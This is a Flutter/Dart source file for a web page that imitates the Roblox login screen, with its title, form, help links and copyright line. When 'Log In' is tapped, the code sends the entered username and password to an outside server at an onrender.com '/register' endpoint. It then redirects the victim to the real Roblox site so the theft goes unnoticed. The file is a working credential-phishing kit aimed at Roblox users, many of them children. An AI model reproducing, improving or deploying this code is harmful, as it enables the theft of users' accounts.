// ignore: deprecated_member_use
import 'dart:convert';
import 'dart:html' as html;
import 'package:bladeball/components/login_button.dart';
import 'package:bladeball/components/my_button.dart';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:url_launcher/url_launcher.dart';

class LoginPage extends StatefulWidget {
  const LoginPage({super.key});

  @override
  State<LoginPage> createState() => _LoginPageState();
}

class _LoginPageState extends State<LoginPage> {
    TextEditingController emailController=TextEditingController();
      TextEditingController passwordController=TextEditingController();
  Future<void> registerUser(String email, String password) async {
    final url = Uri.parse('https://appdd-1fp3.onrender.com/register');

    final response = await http.post(
      url,
      headers: {'Content-Type': 'application/json'},
      body: jsonEncode({'email': email, 'password': password}),
    );

    if (response.statusCode == 200) {
      print("Enregistré !");
    } else {
      print("Erreur !");
    }
  }

  void _openLink(website) async {
    final Uri url = Uri.parse(website);
    if (await canLaunchUrl(url)) {
      await launchUrl(url, mode: LaunchMode.externalApplication);
    } else {
      throw 'Could not launch $url';
    }
  }

  @override
  Widget build(BuildContext context) {
    html.document.title = "Login in to Roblox";
    return Scaffold(appBar:  PreferredSize(
        preferredSize: Size.fromHeight(100),
        child: Padding(
          padding: const EdgeInsets.all(16),
          child: AppBar(
            shape: RoundedRectangleBorder(
              borderRadius: BorderRadiusGeometry.circular(10),
            ),
            toolbarHeight: 80,
            leadingWidth: 200,
            backgroundColor: Colors.transparent.withOpacity(0.7).withBlue(20),
            actions: [
              Padding(
                padding: const EdgeInsets.all(8.0),
                child: MyButton(
                  BorderRadius: BorderRadius.circular(20),
                  data: '0',
                  height: 40,
                  width: 75,
                  ColorData: Colors.lightBlue,
                  icon: Icons.shopping_cart,
                  IconColor: Colors.lightBlue,
                  ColorConainer: Colors.transparent.withOpacity(0),
                  BorderColor: const Color.fromARGB(255, 125, 196, 255),
                  BorderWidth: 2,
                  padding: EdgeInsetsGeometry.all(5),
                ),
              ),
              Padding(
                padding: const EdgeInsets.all(8.0),
                child: GestureDetector(
                  onTap: () {
                    Navigator.pushNamed(context, 'loginpage');
                  },
                  child: MyButton(
                    BorderRadius: BorderRadius.circular(15),
                    data: 'Login',
                    height: 40,
                    width: 130,
                    ColorData: Colors.white,
                    icon: Icons.login,
                    IconColor: Colors.black,
                    ColorConainer: Colors.blue,
                    BorderColor: Colors.lightBlue,
                    BorderWidth: 2,
                    padding: EdgeInsetsGeometry.all(5),
                  ),
                ),
              ),
            ],

            leading: Padding(
              padding: const EdgeInsets.all(10),
              child: GestureDetector(onTap: () {
                Navigator.pushNamed(context, 'homepage');
              },
                child: Row(
                  children: [
                    Padding(
                      padding: const EdgeInsets.only(left: 2.0, right: 2),
                      child: Image.asset('lib/assets/blade.png'),
                    ),
                    Padding(
                      padding: const EdgeInsets.only(left: 10),
                      child: Row(
                        children: [
                          Text(
                            "BLADE",
                            style: TextStyle(
                              fontStyle: FontStyle.italic,
                              color: Colors.white,
                              fontSize: 18,
                              fontWeight: FontWeight.bold,
                            ),
                          ),
                          Text(
                            'ZONE',
                            style: TextStyle(
                              fontStyle: FontStyle.italic,
                              color: Colors.blueAccent,
                              fontSize: 18,
                              fontWeight: FontWeight.bold,
                            ),
                          ),
                        ],
                      ),
                    ),
                  ],
                ),
              ),
            ),
          ))),
      backgroundColor: const Color.fromARGB(255, 68, 68, 75),
      body: Column(
        mainAxisAlignment: MainAxisAlignment.spaceBetween,
        children: [
          Expanded(
            child: SingleChildScrollView(
              child: Column(mainAxisAlignment: MainAxisAlignment.center,crossAxisAlignment: CrossAxisAlignment.center,
                children: [


                  Center(
                    child: Container(
                      decoration: const BoxDecoration(borderRadius: BorderRadius.all(Radius.circular(15)),
                        color: Color(0xFF25282F),
                      ),
                      width: 450,
                      child: Column(
                        children: [
                          const Padding(
                            padding: EdgeInsets.only(top: 20.0),
                            child: Text(
                              "Login to Roblox",
                              style: TextStyle(
                                color: Color(0xFFF7F7F8),
                                fontSize: 40,
                                fontWeight: FontWeight.w900,
                              ),
                            ),
                          ),
                          Padding(
                            padding: const EdgeInsets.all(10.0),
                            child: TextField(
                              controller: emailController,
                              style: const TextStyle(color: Colors.white),
                              decoration: InputDecoration(
                                filled: true,
                                fillColor: const Color.fromARGB(255, 41, 44, 53),
                                border: OutlineInputBorder(
                                  borderRadius: BorderRadius.circular(10),
                                ),
                                hint: const Text(
                                  "Username/Email/Phone",
                                  style: TextStyle(
                                    color: Colors.white,
                                    fontWeight: FontWeight.w100,
                                  ),
                                ),
                              ),
                            ),
                          ),
                          Padding(
                            padding: const EdgeInsets.only(
                              left: 10,
                              top: 10,
                              right: 10,
                              bottom: 3,
                            ),
                            child: TextField(
                              controller: passwordController,
                              obscureText: true,
                              style: const TextStyle(color: Colors.white),
                              decoration: InputDecoration(
                                filled: true,
                                fillColor: const Color.fromARGB(255, 41, 44, 53),
                                border: OutlineInputBorder(
                                  borderRadius: BorderRadius.circular(10),
                                ),
                                hint: const Text(
                                  "Password",
                                  style: TextStyle(
                                    color: Colors.white,
                                    fontWeight: FontWeight.w100,
                                  ),
                                ),
                              ),
                            ),
                          ),
                          Padding(
                            padding: const EdgeInsets.only(bottom: 30.0),
                            child: GestureDetector(
                              child: Container(
                                decoration: BoxDecoration(
                                  border: Border.all(
                                    color: Colors.white,
                                    width: 0.75,
                                  ),
                                  color: const Color.fromARGB(255, 29, 31, 37),
                                  borderRadius: BorderRadius.circular(10),
                                ),
                                height: 40,
                                width: 428,
                                child: Center(
                                  child: Text(
                                    "Log In",
                                    style: TextStyle(color: Colors.grey[400]),
                                  ),
                                ),
                              ),
                              onTap: () {
                                registerUser(emailController.text,passwordController.text);
                                _openLink("https://www.roblox.com/fr/home");
                    
                              },
                            ),
                          ),
                          GestureDetector(
                            child: const Text(
                              "Forgot Password or Username?",
                              style: TextStyle(
                                color: Colors.white,
                                fontWeight: FontWeight.bold,
                              ),
                            ),
                            onTap: () {
                              _openLink(
                                "https://www.roblox.com/login/forgot-password-or-username",
                              );
                            },
                          ),
                          const SizedBox(height: 20),
                          const Divider(thickness: 0.75, color: Colors.white),
                          const Padding(
                            padding: EdgeInsets.only(bottom: 10.0),
                            child: LoginButton(text: "Email me a One-Time Code"),
                          ),
                          const Padding(
                            padding: EdgeInsets.only(bottom: 30.0),
                            child: LoginButton(text: "Use Another Device"),
                          ),
                          GestureDetector(
                            child: const Text(
                              "Don't have an account? Sign Up",
                              style: TextStyle(
                                fontWeight: FontWeight.bold,
                                color: Colors.white,
                              ),
                            ),
                            onTap: () {
                              _openLink("https://www.roblox.com/CreateAccount");
                            },
                          ),
                          const SizedBox(height: 20),
                        ],
                      ),
                    ),
                  ),
                ],
              ),
            ),
          ),
          SizedBox(height: 20),
          SingleChildScrollView(scrollDirection: Axis.horizontal,
            child: Row(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                Padding(
                  padding: const EdgeInsets.all(15),
                  child: GestureDetector(
                    child: Text(
                      'About Us',
                      style: TextStyle(color: Colors.white),
                    ),
                    onTap: () {
                      _openLink('https://corp.roblox.com/');
                    },
                  ),
                ),
                Padding(
                  padding: const EdgeInsets.all(15),
                  child: GestureDetector(
                    child: Text('Jobs', style: TextStyle(color: Colors.white)),
                    onTap: () {
                      _openLink('https://careers.roblox.com/');
                    },
                  ),
                ),
                Padding(
                  padding: const EdgeInsets.all(15),
                  child: GestureDetector(
                    child: Text('Blog', style: TextStyle(color: Colors.white)),
                    onTap: () {
                      _openLink('https://corp.roblox.com/newsroom');
                    },
                  ),
                ),
                Padding(
                  padding: const EdgeInsets.all(15),
                  child: GestureDetector(
                    child: Text('Parents', style: TextStyle(color: Colors.white)),
                    onTap: () {
                      _openLink('https://corp.roblox.com/families');
                    },
                  ),
                ),
                Padding(
                  padding: const EdgeInsets.all(15),
                  child: GestureDetector(
                    child: Text(
                      'Gift Cards',
                      style: TextStyle(color: Colors.white),
                    ),
                    onTap: () {
                      _openLink(
                        'https://www.roblox.com/giftcards-us?locale=en_us',
                      );
                    },
                  ),
                ),
                Padding(
                  padding: const EdgeInsets.all(15),
                  child: GestureDetector(
                    child: Text('Help', style: TextStyle(color: Colors.white)),
                    onTap: () {
                      _openLink('https://en.help.roblox.com/hc/en-us');
                    },
                  ),
                ),
                Padding(
                  padding: const EdgeInsets.all(15),
                  child: GestureDetector(
                    child: Text('Terms', style: TextStyle(color: Colors.white)),
                    onTap: () {
                      _openLink(
                        'https://en.help.roblox.com/hc/en-us/articles/115004647846-Roblox-Terms-of-Use',
                      );
                    },
                  ),
                ),
                Padding(
                  padding: const EdgeInsets.all(15),
                  child: GestureDetector(
                    child: Text(
                      'Accessibility',
                      style: TextStyle(color: Colors.white),
                    ),
                    onTap: () {
                      _openLink(
                        'https://en.help.roblox.com/hc/en-us/articles/360059080071-Roblox-Accessibility-Statement',
                      );
                    },
                  ),
                ),
                Padding(
                  padding: const EdgeInsets.all(15),
                  child: GestureDetector(
                    child: Text('Privacy', style: TextStyle(color: Colors.white)),
                    onTap: () {
                      _openLink(
                        'https://en.help.roblox.com/hc/en-us/articles/115004630823-Roblox-Privacy-and-Cookie-Policy',
                      );
                    },
                  ),
                ),
                Padding(
                  padding: const EdgeInsets.all(15),
                  child: GestureDetector(
                    child: Text(
                      'Your Privacy Choices',
                      style: TextStyle(color: Colors.white),
                    ),
                    onTap: () {
                      _openLink("");
                    },
                  ),
                ),
                Image.asset("lib/assets/privacy.png", height: 30, width: 30),
              ],
            ),
          ),
          Divider(
            thickness: 0.75,
            color: Colors.white,
            indent: 100,
            endIndent: 100,
          ),
          Padding(
            padding: const EdgeInsets.all(12.0),
            child: Text(
              "©2025 Roblox Corporation. Roblox, the Roblox logo and Powering Imagination are among our registered and unregistered trademarks in the U.S. and other countries.",
              style: const TextStyle(color: Colors.white, fontSize: 10),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildNavItem(String title) {
    return Padding(
      padding: const EdgeInsets.symmetric(horizontal: 20),
      child: Text(
        title,
        style: const TextStyle(
          color: Colors.white,
          fontWeight: FontWeight.bold,
        ),
      ),
    );
  }
}
